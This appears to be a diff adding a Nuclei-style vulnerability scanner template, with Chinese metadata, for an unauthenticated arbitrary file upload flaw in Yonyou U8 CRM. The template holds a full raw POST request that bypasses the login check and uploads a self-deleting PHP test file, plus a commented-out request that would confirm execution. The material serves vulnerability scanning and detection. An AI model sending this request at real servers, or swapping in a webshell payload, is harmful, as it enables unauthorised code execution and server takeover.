@@ -1,0 +1,82 @@
+id: 2024-105141350
+
+info:
+  name: 用友u8crm-swfupload接口存在任意文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    攻击者未经授权可以上传木马文件导致webshell，可获取服务器权限；
+  reference:
+    - https://security.yonyou.com/#/noticeInfo?id=445
+  remediation: |
+    升级官方补丁,重启服务
+  classification:
+    cve-id: 2024-105141350
+    cvss-score: 9.8
+    cwe-id: CWE-434
+  metadata:
+    date: 2023-12-01
+    version: | 
+      用友U8crm
+    fofa-query: body="用友U8CRM"
+  tags: yonyou,rce,u8,u8crm,fileupload
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.ashx"
+
+
+http: 
+  - raw:
+      - |
+        POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------269520967239406871642430066855
+        Content-Length: 394
+
+        -----------------------------269520967239406871642430066855
+        Content-Disposition: form-data; name="file"; filename="%s.php "
+        Content-Type: application/octet-stream
+
+        <?print(11*11);sleep(30);unlink(__FILE__);?>
+        -----------------------------269520967239406871642430066855
+        Content-Disposition: form-data; name="upload"
+
+        upload
+        -----------------------------269520967239406871642430066855--
+
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        internal: true # Required for using dynamic variables
+        regex:
+          - "tmpfile\\\\\\\\([^\\\\]+)\\.tmp\\.php"
+        group: 1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "\"success\":true")'
+        condition: and
+  
+  # - raw:
+  #     - |
+  #       @timeout: 25s
+  #       GET /tmpfile/{{filename}}.tmp.php HTTP/1.1
+  #       Host: {{Hostname}}
+  #       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+  #       Accept: */*
+  #       Accept-Encoding: gzip, deflate, br
+  #       Accept-Language: zh-CN,zh;q=0.9
+  #       Connection: close
+
+  #   matchers:
+  #     - type: dsl
+  #       dsl:
+  #         - 'status_code_2 == 200'
+  #         - 'contains(body_2, "121")'
+  #       condition: and
